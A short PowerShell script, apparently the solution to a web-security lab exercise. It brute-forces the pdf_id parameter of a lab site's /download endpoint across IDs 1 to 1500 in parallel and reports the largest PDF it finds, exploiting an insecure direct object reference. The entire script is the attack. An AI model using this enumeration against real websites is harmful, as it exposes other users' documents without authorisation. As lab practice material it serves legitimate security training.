$url = Read-Host -Prompt 'Input the URL for your lab environment'
if (-not $url.StartsWith('https://', 'OrdinalIgnoreCase')) {
    $url = 'https://' + $url
}
$url = $url.TrimEnd('/') + "/download"
$ids = 1..1500
$results = New-Object System.Collections.Concurrent.ConcurrentQueue[PSCustomObject]

# Test each ID and look for the largest PDF
$ids | ForEach-Object -ThrottleLimit 20 -Parallel {
    $id = $_
    $form = @{
        pdf_id = $id
    }
    $response = Invoke-WebRequest -SkipHttpErrorCheck -Uri ${using:url} -Method Post -Form $form
    if ($response.StatusCode -eq 200) {
        $contentType = $response.Headers['Content-Type']
        if ($contentType -eq 'application/pdf') {
            $contentLength = $response.Headers['Content-Length']
            Write-Host -ForegroundColor Yellow "Found a PDF with ID $id and length $contentLength"
            $resultsLocal = ${using:results}
            $resultsLocal.Enqueue([PSCustomObject]@{ Id = $id; ContentLength = [int]$contentLength[0]})
        }
        else {
            Write-Host "Did not find a PDF with ID $id"
        }
    }
    else {
        Write-Host "Did not find a PDF with ID $id"
    }
}

$largestFile = $results | Sort-Object -Property ContentLength -Descending | Select-Object -First 1
$largestFileId = $largestFile.Id
Write-Host -ForegroundColor Green "The largest PDF has ID $largestFileId"
